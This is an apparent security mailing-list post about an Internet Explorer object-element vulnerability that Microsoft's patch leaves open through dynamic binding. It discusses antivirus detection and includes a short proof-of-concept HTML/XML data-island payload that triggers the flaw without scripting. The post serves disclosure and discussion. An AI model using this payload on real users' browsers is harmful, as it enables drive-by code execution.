In our testing we found that Virusscan 7 caught this, however Virusscan 4.5x with the latest DAT did not.

Updated antivirus software should catch this exploit and prevent any application from being launched.
We have McAfee VirusScan 7 Ent. which caught both exploit examples at http://greymagic.com/adv/gm001-ie/

>The patch for Drew's object data=funky.hta doesn't work:

This is the exact same issue as http://greymagic.com/adv/gm001-ie/, which explains the problem in detail. Microsoft again patches the object element in HTML, but it doesn't patch the dynamic version of that same element.

>1. Disable Active Scripting

This actually means that no scripting is needed at all in order to exploit this amazingly critical vulnerability:

<span datasrc="#oExec" datafld="exploit" dataformatas="html"></span> <xml id="oExec">
    <security>
        <exploit>
            <![CDATA[
            <object data=x.asp></object>
            ]]>
        </exploit>
    </security>
</xml>

Ouch.
